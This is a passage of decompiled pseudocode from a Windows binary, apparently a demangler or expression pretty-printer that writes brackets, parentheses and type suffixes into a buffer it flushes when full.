iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            iVar20 = 0;\n        }\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x7d;\n        in_EAX[0x104] = 0x7d;\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x31:\n        uVar17 = param_1[2];\n        puVar15 = 0x525433;\n        uVar26 = 0x6f;\n        iVar20 = *(uVar17 + 8);\n        iVar4 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar4 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar8 = 1;\n                iVar4 = 0;\n            }\n            else {\n                iVar8 = iVar4 + 1;\n            }\n            *(in_EAX + 0x100) = iVar8;\n            in_EAX[iVar4] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x52543a) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar4 = iVar8;\n        }\n        pcVar16 = *(uVar17 + 4);\n        if (*pcVar16 + 0x9fU < 0x1a) {\n            if (iVar8 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar4 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar4 + 1;\n            in_EAX[iVar4] = 0x20;\n            in_EAX[0x104] = 0x20;\n            pcVar16 = *(uVar17 + 4);\n        }\n        if (pcVar16[iVar20 + -1] == ' ') {\n            iVar20 = iVar20 + -1;\n        }\n        if (iVar20 == 0) {\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            pcVar23 = pcVar16 + iVar20;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                cVar12 = *pcVar16;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pcVar16 = pcVar16 + 1;\n                *(in_EAX + 0x100) = iVar4;\n                in_EAX[iVar20] = cVar12;\n                in_EAX[0x104] = cVar12;\n                iVar20 = iVar4;\n            } while (pcVar23 != pcVar16);\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x32:\n        puVar15 = 0x52543c;\n        uVar26 = 0x6f;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525444) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    default:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x34:\n        puVar15 = 0x52543c;\n        uVar26 = 0x6f;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525444) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        if (*(in_EAX + 0x148) != NULL) {\n            appuStack92[0] = *(in_EAX + 0x110);\n            *(in_EAX + 0x110) = appuStack92;\n            appuStack92[1] = *(in_EAX + 0x148);\n        }\n        if (*param_1[2] == 4) {\n            fcn.004306e0();\n            if (*(in_EAX + 0x148) != 0) {\n                *(in_EAX + 0x110) = appuStack92[0];\n            }\n            if (in_EAX[0x104] == '<') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3c;\n            in_EAX[0x104] = 0x3c;\n            fcn.004306e0();\n            if (in_EAX[0x104] == '>') {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x20;\n                in_EAX[0x104] = 0x20;\n            }\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x3e;\n            in_EAX[0x104] = 0x3e;\n        }\n        else {\n            fcn.004306e0();\n            if (*(in_EAX + 0x148) != 0) {\n                *(in_EAX + 0x110) = appuStack92[0];\n            }\n        }\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x35:\n        fcn.00436320();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x36:\n        piVar5 = param_1[3];\n        iVar20 = *param_1[2];\n        if (iVar20 == 0x31) {\n            puVar19 = *param_1[2][2];\n            iVar20 = sub.msvcrt.dll_strcmp(puVar19, 0x525445);\n            ppuStack128 = piVar5;\n            if ((iVar20 == 0) && (*piVar5 == 3)) {\n                if ((*piVar5[2] == 1) && (ppuStack128 = piVar5[2],  *piVar5[3] != 0x29)) {\n                    ppuStack128 = piVar5;\n                }\n            }\n            else if (*piVar5 == 0x38) {\n                fcn.004363c0();\n                fcn.00436320();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = sub.msvcrt.dll_strcmp(puVar19, 0x525448);\n            bVar27 = false;\n            bVar28 = iVar20 == 0;\n            if (bVar28) {\n                for (piVar5 = fcn.0042dd40(); ((piVar5 != NULL && (*piVar5 == 0x2f)) && (piVar5[2] != 0));\n                    piVar5 = piVar5[3]) {\n                    iVar20 = iVar20 + 1;\n                }\n                pppuVar22 = appuStack92;\n                sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, iVar20);\n                uVar17 = 0xffffffff;\n                pppuVar13 = pppuVar22;\n                do {\n                    if (uVar17 == 0) break;\n                    uVar17 = uVar17 - 1;\n                    cVar12 = *pppuVar13;\n                    pppuVar13 = pppuVar13 + 1;\n                } while (cVar12 != '\\0');\n                pppuVar13 = pppuVar22 + (~uVar17 - 1);\n                if (~uVar17 - 1 != 0) {\n                    do {\n                        cVar12 = *pppuVar22;\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        pppuVar22 = pppuVar22 + 1;\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = cVar12;\n                        in_EAX[0x104] = cVar12;\n                    } while (pppuVar13 != pppuVar22);\n                }\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = 3;\n            puVar18 = puVar19;\n            puVar24 = 0x524eb3;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                bVar27 = *puVar18 < *puVar24;\n                bVar28 = *puVar18 == *puVar24;\n                puVar18 = puVar18 + 1;\n                puVar24 = puVar24 + 1;\n            } while (bVar28);\n            uVar26 = 0;\n            uVar29 = (!bVar27 && !bVar28) == bVar27;\n            if (uVar29) {\n                iVar20 = 0;\n                do {\n                    if ((*ppuStack128 != 0x2f) || (ppuStack128[2] == NULL)) break;\n                    if (*ppuStack128[2] == 0x4a) {\n                        piVar5 = fcn.0042dd40();\n                        iVar4 = 0;\n                        for (; ((piVar5 != NULL && (*piVar5 == 0x2f)) && (piVar5[2] != 0)); piVar5 = piVar5[3]) {\n                            iVar4 = iVar4 + 1;\n                        }\n                        iVar20 = iVar20 + iVar4;\n                    }\n                    else {\n                        iVar20 = iVar20 + 1;\n                    }\n                    ppuStack128 = ppuStack128[3];\n                } while (ppuStack128 != NULL);\n                pppuVar22 = appuStack92;\n                sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, iVar20);\n                uVar17 = 0xffffffff;\n                pppuVar13 = pppuVar22;\n                do {\n                    if (uVar17 == 0) break;\n                    uVar17 = uVar17 - 1;\n                    cVar12 = *pppuVar13;\n                    pppuVar13 = pppuVar13 + 1;\n                } while (cVar12 != '\\0');\n                if (~uVar17 - 1 != 0) {\n                    pppuVar13 = pppuVar22 + (~uVar17 - 1);\n                    iVar20 = *(in_EAX + 0x100);\n                    do {\n                        cVar12 = *pppuVar22;\n                        if (iVar20 == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            iVar20 = 0;\n                        }\n                        pppuVar22 = pppuVar22 + 1;\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = cVar12;\n                        in_EAX[0x104] = cVar12;\n                        iVar20 = iVar20 + 1;\n                    } while (pppuVar13 != pppuVar22);\n                }\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            fcn.00436320();\n            iVar20 = 3;\n            puVar18 = puVar19;\n            puVar24 = 0x52544b;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                uVar26 = *puVar18 < *puVar24;\n                uVar29 = *puVar18 == *puVar24;\n                puVar18 = puVar18 + 1;\n                puVar24 = puVar24 + 1;\n            } while (uVar29);\n            bVar27 = false;\n            bVar28 = (!uVar26 && !uVar29) == uVar26;\n            if (bVar28) {\n                fcn.004306e0();\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n            iVar20 = 3;\n            puVar18 = 0x524eb0;\n            do {\n                if (iVar20 == 0) break;\n                iVar20 = iVar20 + -1;\n                bVar27 = *puVar19 < *puVar18;\n                bVar28 = *puVar19 == *puVar18;\n                puVar19 = puVar19 + 1;\n                puVar18 = puVar18 + 1;\n            } while (bVar28);\n            if ((!bVar27 && !bVar28) == bVar27) {\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x28;\n                in_EAX[0x104] = 0x28;\n                fcn.004306e0();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x29;\n                in_EAX[0x104] = 0x29;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n                break;\n            }\n        }\n        else if (iVar20 == 0x33) {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x28;\n            in_EAX[0x104] = 0x28;\n            fcn.004306e0();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x29;\n            in_EAX[0x104] = 0x29;\n        }\n        else {\n            fcn.00436320();\n        }\n        fcn.004363c0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x37:\n        if (*param_1[3] == 0x38) {\n            if (((**(param_1[2] + 8))[1] == 'c') &&\n               ((cVar12 = ***(param_1[2] + 8),  cVar12 + 0x9dU < 2 || (cVar12 + 0x8eU < 2)))) {\n                fcn.00436320();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                puVar15 = 0x52544e;\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x3c;\n                in_EAX[0x104] = 0x3c;\n                fcn.004306e0();\n                iVar20 = *(in_EAX + 0x100);\n                do {\n                    uVar26 = *puVar15;\n                    if (iVar20 == 0xff) {\n                        in_EAX[0xff] = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar20 = 0;\n                    }\n                    puVar15 = puVar15 + 1;\n                    *(in_EAX + 0x100) = iVar20 + 1;\n                    in_EAX[iVar20] = uVar26;\n                    in_EAX[0x104] = uVar26;\n                    iVar20 = iVar20 + 1;\n                } while (puVar15 != 0x525450);\n                fcn.004306e0();\n                if (*(in_EAX + 0x100) == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x29;\n                in_EAX[0x104] = 0x29;\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n            else {\n                iVar20 = fcn.004364b0(param_1 + 3);\n                if (iVar20 == 0) {\n                    piVar5 = param_1[2];\n                    if (((*piVar5 == 0x31) && (*(piVar5[2] + 8) == 1)) && (**(piVar5[2] + 4) == '>')) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x28;\n                        in_EAX[0x104] = 0x28;\n                        piVar5 = param_1[2];\n                    }\n                    iVar20 = sub.msvcrt.dll_strcmp(*piVar5[2], 0x524eb6);\n                    if ((iVar20 == 0) && (**(param_1[3] + 8) == 3)) {\n                        if (*(*(param_1[3] + 8))[3] != 0x29) {\n                            *(in_EAX + 0x118) = 1;\n                        }\n                        fcn.004363c0();\n                    }\n                    else {\n                        fcn.004363c0();\n                    }\n                    uVar2 = **(param_1[2] + 8);\n                    iVar20 = sub.msvcrt.dll_strcmp(uVar2, 0x525451);\n                    if (iVar20 == 0) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x5b;\n                        in_EAX[0x104] = 0x5b;\n                        fcn.004306e0();\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x5d;\n                        in_EAX[0x104] = 0x5d;\n                    }\n                    else {\n                        iVar20 = sub.msvcrt.dll_strcmp(uVar2, 0x524eb6);\n                        if (iVar20 != 0) {\n                            fcn.00436320();\n                        }\n                        fcn.004363c0();\n                    }\n                    if (((*param_1[2] == 0x31) && (iVar20 = param_1[2][2],  *(iVar20 + 8) == 1)) &&\n                       (**(iVar20 + 4) == '>')) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x29;\n                        in_EAX[0x104] = 0x29;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    else {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                }\n                else {\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                }\n            }\n        }\n        else {\n            *(in_EAX + 0x118) = 1;\n            uVar17 = param_1[1] - 1;\n        }\n        break;\n    case 0x38:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x39:\n        if ((*param_1[3] == 0x3a) && (*param_1[3][3] == 0x3b)) {\n            iVar20 = fcn.004364b0(param_1 + 3);\n            if (iVar20 == 0) {\n                iVar20 = *(param_1[3] + 8);\n                iVar4 = *(*(param_1[3] + 0xc) + 0xc);\n                iVar8 = sub.msvcrt.dll_strcmp(**(param_1[2] + 8), 0x524ebf);\n                if (iVar8 == 0) {\n                    fcn.004363c0();\n                    fcn.00436320();\n                    fcn.004363c0();\n                    fcn.0042d5b0();\n                    fcn.004363c0();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                }\n                else {\n                    fcn.0042d5b0();\n                    if (*(iVar20 + 8) != 0) {\n                        fcn.004363c0();\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x20;\n                        in_EAX[0x104] = 0x20;\n                    }\n                    fcn.004306e0();\n                    if (iVar4 == 0) {\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    else {\n                        fcn.004363c0();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                }\n            }\n            else {\n                uVar17 = param_1[1] - 1;\n                iVar20 = *(in_EAX + 0x11c) + -1;\n            }\n        }\n        else {\n            *(in_EAX + 0x118) = 1;\n            uVar17 = param_1[1] - 1;\n        }\n        break;\n    case 0x3a:\n    case 0x3b:\n        *(in_EAX + 0x118) = 1;\n        uVar17 = param_1[1] - 1;\n        break;\n    case 0x3c:\n    case 0x3d:\n        uVar17 = 0;\n        if ((*param_1[2] == 0x27) && (uVar17 = *(param_1[2][2] + 0x10),  uVar17 != 0)) {\n            if (uVar17 < 7) {\n                if (*param_1[3] == 0) {\n                    if (uVar6 == 0x3d) {\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x2d;\n                        in_EAX[0x104] = 0x2d;\n                    }\n                    fcn.004306e0();\n    // switch table (5 cases) at 0x52563c\n                    switch(uVar17) {\n                    case 2:\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x75;\n                        in_EAX[0x104] = 0x75;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 3:\n                        if (*(in_EAX + 0x100) == 0xff) {\n                            in_EAX[0xff] = 0;\n                            (**(in_EAX + 0x108))();\n                            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                            *(in_EAX + 0x100) = 0;\n                        }\n                        iVar20 = *(in_EAX + 0x100);\n                        *(in_EAX + 0x100) = iVar20 + 1;\n                        in_EAX[iVar20] = 0x6c;\n                        in_EAX[0x104] = 0x6c;\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 4:\n                        fcn.0042d5b0();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 5:\n                        fcn.0042d5b0();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    case 6:\n                        fcn.0042d5b0();\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                        break;\n                    default:\n                        uVar17 = param_1[1] - 1;\n                        iVar20 = *(in_EAX + 0x11c) + -1;\n                    }\n                    break;\n                }\n            }\n            else if ((((uVar17 == 7) && (piVar5 = param_1[3],  *piVar5 == 0)) && (piVar5[3] == 1)) && (uVar6 == 0x3c)) {\n                if (*piVar5[2] == '0') {\n                    fcn.0042d5b0();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n                if (*piVar5[2] == '1') {\n                    fcn.0042d5b0();\n                    uVar17 = param_1[1] - 1;\n                    iVar20 = *(in_EAX + 0x11c) + -1;\n                    break;\n                }\n            }\n        }\n        if (*(in_EAX + 0x100) == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar20 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar20 + 1;\n        in_EAX[iVar20] = 0x28;\n        in_EAX[0x104] = 0x28;\n        fcn.004306e0();\n        iVar20 = *(in_EAX + 0x100);\n        if (iVar20 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *in_EAX = 0x29;\n            in_EAX[0x104] = 0x29;\n            uVar6 = *param_1;\n            *(in_EAX + 0x100) = 1;\n            if (uVar6 == 0x3d) goto code_r0x00433e4a;\n        }\n        else {\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x29;\n            in_EAX[0x104] = 0x29;\n            if (*param_1 == 0x3d) {\n                if (iVar20 + 1 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    *(in_EAX + 0x100) = 0;\n                }\ncode_r0x00433e4a:\n                iVar20 = *(in_EAX + 0x100);\n                *(in_EAX + 0x100) = iVar20 + 1;\n                in_EAX[iVar20] = 0x2d;\n                in_EAX[0x104] = 0x2d;\n            }\n        }\n        if (uVar17 == 8) {\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x5b;\n            in_EAX[0x104] = 0x5b;\n            fcn.004306e0();\n            if (*(in_EAX + 0x100) == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                *(in_EAX + 0x100) = 0;\n            }\n            iVar20 = *(in_EAX + 0x100);\n            *(in_EAX + 0x100) = iVar20 + 1;\n            in_EAX[iVar20] = 0x5d;\n            in_EAX[0x104] = 0x5d;\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        else {\n            fcn.004306e0();\n            uVar17 = param_1[1] - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        break;\n    case 0x3e:\n        puVar15 = 0x525473;\n        uVar26 = 0x6a;\n        iVar20 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar20 == 0xff) {\n                in_EAX[0xff] = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar4 = 1;\n                iVar20 = 0;\n            }\n            else {\n                iVar4 = iVar20 + 1;\n            }\n            *(in_EAX + 0x100) = iVar4;\n            in_EAX[iVar20] = uVar26;\n            in_EAX[0x104] = uVar26;\n            if (puVar15 == 0x525480) break;\n            uVar26 = *puVar15;\n            puVar15 = puVar15 + 1;\n            iVar20 = iVar4;\n        }\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x3f:\n        fcn.004306e0();\n        fcn.004306e0();\n        uVar17 = param_1[1] - 1;\n        iVar20 = *(in_EAX + 0x11c) + -1;\n        break;\n    case 0x40:\n        uVar6 = param_1[2];\n        iVar4 = *(in_EAX + 0x100);\n        if (iVar4 == 0xff) {\n            in_EAX[0xff] = 0;\n            (**(in_EAX + 0x108))();\n            uVar17 = param_1[1];\n            iVar4 = 0;\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            uVar17 = uVar17 - 1;\n            iVar20 = *(in_EAX + 0x11c) + -1;\n        }\n        *(in_EAX + 0x100) = iVar4 + 1;\n        uStack132._0_1_ = uVar6;\n        in_EAX[iVar4] = uStack132;\n        in_EAX[0x104] = uStack132;\n        break;\n    case 0x41:\n        pppuVar22 = appuStack92;\n        sub.msvcrt.dll_sprintf(pppuVar22, 0x5252a7, param_1[2]);\n        pppuVar13 = pppuVar22;\n        do {\n            pppuVar25 = pppuVar13;\n            uVar6 = *pppuVar25 + 0xfefefeffU & ~*pppuVar25;\n            uVar17 = uVar6 & 0x80808080;\n            pppuVar13 = pppuVar25 + 1;\n        } while (uVar17 == 0);\n        bVar27 = (uVar6 & 0x8080) == 0;\n        if (bVar27) {\n            uVar17 = uVar17 >> 0x10;\n        }\n        if (bVar27) {\n            pppuVar13 = pppuVar25 + 6;\n        }\n        puVar15 = pppuVar13 + ((-3 - CARRY1(uVar17, uVar17)) - pppuVar22);\n        if (puVar15 != NULL) {\n            pppuVar13 = pppuVar22 + puVar15;\n            iVar20 = *(in_EAX + 0x100);\n            do {\n                uVar26 = *pppuVar22;\n                if (iVar20 == 0xff) {\n                    in_EAX[0xff] = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar4 = 1;\n                    iVar20 = 0;\n                }\n                else {\n                    iVar4 = iVar20 + 1;\n                }\n                pppuVar22 = pppuVar22 + 1;\n                *(in_EAX + 0x100) = 